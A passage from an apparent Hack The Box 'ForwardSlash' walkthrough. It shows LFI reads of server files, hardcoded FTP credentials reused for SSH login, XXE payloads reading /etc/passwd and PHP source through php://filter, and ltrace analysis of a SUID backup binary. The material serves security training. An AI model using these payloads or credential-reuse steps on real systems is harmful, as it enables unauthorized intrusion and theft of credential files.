<p>Unfortunately it’s the defaced website laying here and it’s the backup website that will be interesting for us. Knowing that the server is Apache you can guess that <code>backup.forwardslash.htb</code> is using a <a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/2.4/en/vhosts/examples.html">Virtual Host</a>. </p>
<p>In addition a common practice is to use the domain name as folder to setup Virtual Host since it’s easier for organization. For example:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Listen 80</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    DocumentRoot <span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">    ServerName forwardslash.htb</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    DocumentRoot <span class="string">&quot;/var/www/forwardslash.htb&quot;</span></span><br><span class="line">    ServerName backup.forwardslash.htb</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>

<p>Let’s now try to see if our theory is correct:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python lfi-blog.py</span><br><span class="line">File path &gt; /var/www/backup.forwardslash.htb/register.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">// Include config file</span><br><span class="line">require_once <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">// Define variables and initialize with empty values</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$password</span> = <span class="variable">$confirm_password</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$username_err</span> = <span class="variable">$password_err</span> = <span class="variable">$confirm_password_err</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<p>Alright! We have the right path. Now let’s check for files found previously by <code>gobuster</code>. One that particularly catch the eye is the <code>/dev/</code> folder since we can not access it:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/79315096-dcd79700-7f02-11ea-9011-58b96cb60f5d.png" alt="dev endpoint forwardslash" title="dev endpoint forwardslash"></p>
<p>Let’s see if we can access the <code>index.php</code> inside this folder to see what it is doing:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python lfi-blog.py</span><br><span class="line">File path &gt; /var/www/backup.forwardslash.htb/dev/index.php</span><br><span class="line">&lt;?php</span><br><span class="line">[...]</span><br><span class="line"><span class="keyword">if</span> (@ftp_login(<span class="variable">$conn_id</span>, <span class="string">&quot;chiv&quot;</span>, <span class="string">&#x27;N0bodyL1kesBack/&#x27;</span>)) &#123;</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<p>FTP credentials for <code>chiv</code> user, that explains why the defaced homepage mentioned “<em>who even uses XML and Automatic FTP Logins</em>“. </p>
<p>Since <code>nmap</code> didn’t return any open FTP server let’s try to reuse those credentials to login into SSH:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh chiv@forwardslash.htb</span><br><span class="line">chiv@forwardslash.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Tue Mar 24 11:34:37 2020 from 10.10.14.3</span></span><br><span class="line"><span class="string">chiv@forwardslash:~$ ls</span></span><br><span class="line"><span class="string">chiv@forwardslash:~$</span></span><br></pre></td></tr></table></figure>

<h3 id="Method-2-XXE-Local-File-Inclusion-on-dev-API"><a href="#Method-2-XXE-Local-File-Inclusion-on-dev-API" class="headerlink" title="Method 2: XXE Local File Inclusion on /dev/ API"></a>Method 2: XXE Local File Inclusion on /dev/ API</h3><p>The second method was the main one to go to. That’s the one I used. Let’s see in detail the process.</p>
<p>First let’s see the first rabbit hole I fell into. Knowing that the <code>/dev/</code> endpoint can’t be accessed from our host, we can imagine it’s accessible from <code>127.0.0.1</code> right ?<br>With this knowledge we could probably exploit again the <code>profilepicture.php</code> page to access this page using SSRF. Let’s give a try:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/79317113-95063f00-7f05-11ea-93a6-35e7aa075b47.png" alt="SSRF forwardslash"></p>
<p>Alright, that’s a good progress, we managed to access the <code>/dev/</code> endpoint. This gives us a few ideas of what is there: </p>
<ul>
<li><p>An XML API</p>
</li>
<li><p>A page (<code>index.php</code>) to test this API</p>
</li>
<li><p>And probably something related to FTP as seen in the <code>/dev/index.php</code> page source code : <code>&lt;!-- TODO: Fix FTP Login--&gt;</code>.</p>
</li>
</ul>
<p>That’s a lot of useful informations, but what can we really do from here ? Unfortunately not much now since the <code>/dev/index.php</code> page is “interactive”. After trying to exploit this page page from the  <code>profilepicture.php</code> in every possible ways I finally gave up thinking it’s not the right way to go. </p>
<p>When this happen I like to go back to the beginning to make sure I didn’t miss something important. While doing so I remembered my notes:</p>
<blockquote>
<blockquote>
<p>No account found with that username “admin”.</p>
</blockquote>
<p>Might be interesting to keep that in mind for later.</p>
</blockquote>
<p>In the same idea of the recently released “Book” box let’s try to create the <code>admin</code> account to see if you can gain extra privileges on the app: </p>
<p><img src="https://user-images.githubusercontent.com/9076747/79318255-05619000-7f07-11ea-878b-b9622c73f434.png" alt="admin account forwardslash"></p>
<p>It works, at first it don’t seems like we have extra privileges… What about that <code>/dev/</code> endpoint?</p>
<p><img src="https://user-images.githubusercontent.com/9076747/79318514-638e7300-7f07-11ea-8416-5cc19d0fd57e.png" alt="dev endpoint admin forwardslash"></p>
<p>That’s a great progress! And now we can access the returned output of the test function. Now we can focus on finding a vulnerability in this XML Api using the test function.</p>
<p>The first thing that come to mind when working with XML is XXE (<a target="_blank" rel="noopener" href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">XML External Entity Processing</a>). We can see that the content of <code>&lt;request&gt;</code> node is reflected in the output of the API. Can we exploit this behavior to access local resources?</p>
<p>Let’s try with the most common XXE injection adapted to this API format:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">api</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">request</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">api</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/9076747/79319415-938a4600-7f08-11ea-8837-2cbf36788311.png" alt="XXE forwardslash"></p>
<p>Bingo! Let’s now try to access the current page (<code>index.php</code>) to see if we can find details about FTP mentioned in the code source.</p>
<p>If we can guess the current page full path we can go the same way:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> </span></span><br><span class="line"><span class="meta">[<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///var/www/forwardslash.htb/dev/index.php&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">api</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">request</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">api</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>In the case we didn’t know the full current path, it’s also possible to access it using <a target="_blank" rel="noopener" href="https://www.php.net/manual/fr/wrappers.php.php#wrappers.php.filter"><code>php://filter</code></a>:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> </span></span><br><span class="line"><span class="meta">[<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=index.php&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">api</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">request</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">api</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/9076747/79320436-2081cf00-7f0a-11ea-9657-0205f4dc583d.png" alt="php filter xxe forwardslash"></p>
<p>Looks good! Let’s decode this output to see the content of the <code>index.php</code> file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat output | base64 -d &gt; index.php</span><br><span class="line">[hg8@archbook ~]$ head index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//include_once ../session.php;</span><br><span class="line">// Initialize the session</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((!isset(<span class="variable">$_SESSION</span>[<span class="string">&quot;loggedin&quot;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&quot;loggedin&quot;</span>] !== <span class="literal">true</span> || <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] !== <span class="string">&quot;admin&quot;</span>) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    header(<span class="string">&#x27;HTTP/1.0 403 Forbidden&#x27;</span>);</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&lt;h1&gt;403 Access Denied&lt;/h1&gt;&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&lt;h3&gt;Access Denied From &quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>], <span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line">    //<span class="built_in">echo</span> <span class="string">&quot;&lt;h2&gt;Redirecting to login in 3 seconds&lt;/h2&gt;&quot;</span></span><br><span class="line">[hg8@archbook ~]$</span><br></pre></td></tr></table></figure>

<p>And while looking around this <code>index.php</code> we stumbled across:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@ftp_login(<span class="variable">$conn_id</span>, <span class="string">&quot;chiv&quot;</span>, <span class="string">&#x27;N0bodyL1kesBack/&#x27;</span>)) &#123;</span><br></pre></td></tr></table></figure>

<p>FTP credentials for <code>chiv</code> user, that explains why the defaced homepage mentioned “<em>who even uses XML and Automatic FTP Logins</em>“.</p>
<p>Since <code>nmap</code> didn’t return any open FTP server let’s try to reuse those credentials to login into SSH:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh chiv@forwardslash.htb</span><br><span class="line">chiv@forwardslash.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Tue Mar 24 11:34:37 2020 from 10.10.10.10</span></span><br><span class="line"><span class="string">chiv@forwardslash:~$ ls</span></span><br><span class="line"><span class="string">chiv@forwardslash:~$</span></span><br></pre></td></tr></table></figure>

<h3 id="Pivot-chiv-gt-pain"><a href="#Pivot-chiv-gt-pain" class="headerlink" title="Pivot chiv -&gt; pain"></a>Pivot chiv -&gt; pain</h3><p>As we noticed earlier we are going to need to pivot from <code>chiv</code> to <code>pain</code> user in order to gain access to the user flag:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chiv@forwardslash:~$ ls -l /home/pain</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 pain root 4096 Mar 24 12:06 encryptorinator</span><br><span class="line">-rw-r--r-- 1 pain root  256 Jun  3  2019 note.txt</span><br><span class="line">-rw------- 1 pain pain   33 Apr 15 00:33 user.txt</span><br></pre></td></tr></table></figure>

<p>In <code>pain</code> home folder we can read a <code>note.txt</code>: </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chiv@forwardslash:/$ cat /home/pain/note.txt</span><br><span class="line">Pain, even though they got into our server, I made sure to encrypt any </span><br><span class="line">important files and <span class="keyword">then</span> did some crypto magic on the key... </span><br><span class="line">I gave you the key <span class="keyword">in</span> person the other day, so unless these hackers </span><br><span class="line">are some crypto experts we should be good to go.</span><br><span class="line"></span><br><span class="line">-chiv</span><br></pre></td></tr></table></figure>

<p>The tool used to “<em>encrypt</em>“ the important files is also present in <code>pain</code> home folder:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chiv@forwardslash:~$ ls -l /home/pain/encryptorinator/</span><br><span class="line">total 8</span><br><span class="line">-rw-r--r-- 1 pain root 165 Jun  3  2019 ciphertext</span><br><span class="line">-rw-r--r-- 1 pain root 931 Jun  3  2019 encrypter.py</span><br><span class="line">chiv@forwardslash:~$ cat /home/pain/encryptorinator/ciphertext</span><br><span class="line">,L</span><br><span class="line">&gt;2Xբ</span><br><span class="line">|?I)E-˒\/;y[w<span class="comment">#M2ʐY@&#x27;缘泣,P@5f$\*rwF3gX&#125;i6~KY&#x27;%e&gt;xo+g/K&gt;^Nke</span></span><br><span class="line">chiv@forwardslash:~$</span><br></pre></td></tr></table></figure>

<p>Alright, we have a encrypted file and the tool used to encrypt it, if we manage to break the crypto, the <code>cipher</code> will probably offer us a clue to gain access to <code>pain</code> user right ?</p>
<p><img src="https://user-images.githubusercontent.com/9076747/79325948-59be3d00-7f12-11ea-93d9-97fe5ed8d740.jpg" alt="well yes but actually no"></p>
<p>While you can spend time on breaking the crypto -spoiler alert- this will only be useful to gain access to <code>root</code>, and not <code>pain</code> user. </p>
<p>Let’s focus on another unusual point that seems interesting about <code>pain</code> account:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chiv@forwardslash:~$ id pain</span><br><span class="line">uid=1000(pain) gid=1000(pain) groups=1000(pain),1002(backupoperator)</span><br></pre></td></tr></table></figure>

<p><code>pain</code> belongs to the <code>backupoperator</code> group, so there is definitely something going on with a backup process.</p>
<p>While continuing the recon process we stumble across an uncommon backup files:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chiv@forwardslash:~$ ls -l /var/backups/</span><br><span class="line">-rw------- 1 pain pain             526  Jun 21  2019 config.php.bak</span><br><span class="line">drwxrwx--- 2 root backupoperator   4096 May 27  2019 recovery</span><br></pre></td></tr></table></figure>

<p>And an uncommon SUID binary belonging to <code>pain</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chiv@forwardslash:~$ find /usr/bin/ -perm -u=s -<span class="built_in">type</span> f</span><br><span class="line">-r-sr-xr-x 1 pain pain 13384 Mar  6 10:06 backup</span><br></pre></td></tr></table></figure>

<p>That’s probably the backup file and tool mentioned in <code>chiv</code> user <code>note.txt</code>?</p>
<p>Let’s try to see what’s this backup tool is doing:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">chiv@forwardslash:/$ /usr/bin/backup</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">        Pain<span class="string">&#x27;s Next-Gen Time Based Backup Viewer</span></span><br><span class="line"><span class="string">        v0.1</span></span><br><span class="line"><span class="string">        NOTE: not reading the right file yet,</span></span><br><span class="line"><span class="string">        only works if backup is taken in same second</span></span><br><span class="line"><span class="string">----------------------------------------------------------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Current Time: 07:50:39</span></span><br><span class="line"><span class="string">ERROR: 4e5cc88469959df047cf694749b0e917 Does Not Exist or Is Not Accessible By Me, Exiting...</span></span><br><span class="line"><span class="string">chiv@forwardslash:/$</span></span><br></pre></td></tr></table></figure>

<p>Uhm… This doesn’t give us a lot of information:</p>
<blockquote>
<p>ERROR: 4e5cc88469959df047cf694749b0e917 Does Not Exist or Is Not Accessible By Me, Exiting…</p>
</blockquote>
<p><code>4e5cc88469959df047cf694749b0e917</code> is MD5, but of what ? At each run of the binary this MD5 change.</p>
<p>Let’s run the binary through <code>ltrace</code> to see what is it actually doing “behind the hood”:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">chiv@forwardslash:/$ ltrace /usr/bin/backup</span><br><span class="line">getuid()                                                      = 1001</span><br><span class="line">getgid()                                                      = 1001</span><br><span class="line">puts(<span class="string">&quot;--------------------------------&quot;</span>...----------------------------------------------------------------------</span><br><span class="line">       Pain<span class="string">&#x27;s Next-Gen Time Based Backup Viewer</span></span><br><span class="line"><span class="string">       v0.1</span></span><br><span class="line"><span class="string">       NOTE: not reading the right file yet,</span></span><br><span class="line"><span class="string">       only works if backup is taken in same second</span></span><br><span class="line"><span class="string">----------------------------------------------------------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">)                   = 277</span></span><br><span class="line"><span class="string">time(0)                                                       = 1586160529</span></span><br><span class="line"><span class="string">localtime(0x7ffe22beb160)                                     = 0x7fcca77e66a0</span></span><br><span class="line"><span class="string">malloc(13)                                                    = 0x55dc061618e0</span></span><br><span class="line"><span class="string">sprintf(&quot;08:08:49&quot;, &quot;%02d:%02d:%02d&quot;, 8, 8, 49)               = 8</span></span><br><span class="line"><span class="string">strlen(&quot;08:08:49&quot;)                                            = 8</span></span><br><span class="line"><span class="string">malloc(33)                                                    = 0x55dc06161900</span></span><br><span class="line"><span class="string">MD5_Init(0x7ffe22beb0b0, 4000, 0x55dc06161900, 0x55dc06161900) = 1</span></span><br><span class="line"><span class="string">MD5_Update(0x7ffe22beb0b0, 0x55dc061618e0, 8, 0x55dc061618e0) = 1</span></span><br><span class="line"><span class="string">MD5_Final(0x7ffe22beb110, 0x7ffe22beb0b0, 0x7ffe22beb0b0, 0)  = 1</span></span><br><span class="line"><span class="string">snprintf(&quot;0b&quot;, 32, &quot;%02x&quot;, 0xb)                               = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;6c&quot;, 32, &quot;%02x&quot;, 0x6c)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;c9&quot;, 32, &quot;%02x&quot;, 0xc9)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;24&quot;, 32, &quot;%02x&quot;, 0x24)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;3d&quot;, 32, &quot;%02x&quot;, 0x3d)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;b1&quot;, 32, &quot;%02x&quot;, 0xb1)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;b3&quot;, 32, &quot;%02x&quot;, 0xb3)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;a3&quot;, 32, &quot;%02x&quot;, 0xa3)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;79&quot;, 32, &quot;%02x&quot;, 0x79)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;ef&quot;, 32, &quot;%02x&quot;, 0xef)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;a9&quot;, 32, &quot;%02x&quot;, 0xa9)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;56&quot;, 32, &quot;%02x&quot;, 0x56)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;41&quot;, 32, &quot;%02x&quot;, 0x41)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;90&quot;, 32, &quot;%02x&quot;, 0x90)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;62&quot;, 32, &quot;%02x&quot;, 0x62)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;94&quot;, 32, &quot;%02x&quot;, 0x94)                              = 2</span></span><br><span class="line"><span class="string">printf(&quot;Current Time: %s\n&quot;, &quot;08:08:49&quot;Current Time: 08:08:49</span></span><br><span class="line"><span class="string">)                      = 23</span></span><br><span class="line"><span class="string">setuid(1002)                                                  = -1</span></span><br><span class="line"><span class="string">setgid(1002)                                                  = -1</span></span><br><span class="line"><span class="string">access(&quot;0b6cc9243db1b3a379efa95641906294&quot;..., 0)              = -1</span></span><br><span class="line"><span class="string">printf(&quot;ERROR: %s Does Not Exist or Is N&quot;..., &quot;0b6cc9243db1b3a379efa95641906294&quot;...ERROR: 0b6cc9243db1b3a379efa95641906294 Does Not Exist or Is Not Accessible By Me, Exiting...</span></span><br><span class="line"><span class="string">) = 94</span></span><br><span class="line"><span class="string">setuid(1001)                                                  = 0</span></span><br><span class="line"><span class="string">setgid(1001)                                                  = 0</span></span><br><span class="line"><span class="string">remove(&quot;0b6cc9243db1b3a379efa95641906294&quot;...)                 = -1</span></span><br><span class="line"><span class="string">+++ exited (status 0) +++</span></span><br></pre></td></tr></table></figure>

<p>Ok so let’s break it down:</p>
<ol>
<li>We get the current user <code>uid</code> and <code>guid</code></li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getuid() = 1001</span><br><span class="line">getgid() = 1001</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>The current time get generated:</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">time(0)                                         = 1586160529</span><br><span class="line">localtime(0x7ffe22beb160)                       = 0x7fcca77e66a0</span><br><span class="line">malloc(13)                                      = 0x55dc061618e0</span><br><span class="line">sprintf(<span class="string">&quot;08:08:49&quot;</span>, <span class="string">&quot;%02d:%02d:%02d&quot;</span>, 8, 8, 49) = 8</span><br><span class="line">strlen(<span class="string">&quot;08:08:49&quot;</span>)                              = 8</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>A MD5 digest is made of the current time generated previously:</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5_Update(0x7ffe22beb0b0, 0x55dc061618e0, 8, 0x55dc061618e0) = 1</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>The <code>uid</code> and <code>guid</code> is changed to <code>1002</code> which correspond to the <code>backupoperator</code> group in which <code>pain</code> belongs:</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setuid(1002) = -1</span><br><span class="line">setgid(1002) = -1</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>The binary try to access a file named after the MD5 digest generated previously and output error if the file does not exist:</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">access(<span class="string">&quot;0b6cc9243db1b3a379efa95641906294&quot;</span>..., 0) = -1</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ERROR: %s Does Not Exist or Is N&quot;</span>..., <span class="string">&quot;0b6cc9243db1b3a379efa95641906294&quot;</span>...ERROR: 0b6cc9243db1b3a379efa95641906294 Does Not Exist or Is Not Accessible By Me, Exiting...) = 94</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>The <code>uid</code> and <code>guid</code> is set back to normal one and the file gets deleted:</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setuid(1001)                                  = 0</span><br><span class="line">setgid(1001)                                  = 0</span><br><span class="line">remove(<span class="string">&quot;0b6cc9243db1b3a379efa95641906294&quot;</span>...) = -1</span><br></pre></td></tr></table></figure>

<p><strong>Tl;Dr:</strong> The <code>backup</code> binary is looking for a file with a specific name (MD5 of current time) as <code>backupoperator</code> group. </p>
<p>Let’s create a small script to create this specific file to see what happen when the <code>backup</code> find the file he is searching for.</p>
<p>Let’s make it simple to start with:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">DATE=$(date +<span class="string">&quot;%T&quot;</span>) <span class="comment"># Get the current time</span></span><br><span class="line">MD5=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$DATE</span>&quot;</span> | md5sum | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>) <span class="comment"># MD5 of current time</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span> &gt; <span class="string">&quot;<span class="variable">$MD5</span>&quot;</span> <span class="comment"># write file with MD5 digest as name and &#x27;hello&#x27; as content</span></span><br><span class="line">ltrace /usr/bin/backup</span><br></pre></td></tr></table></figure>

<p>The <code>ltrace</code> output now is slightly different:</p>
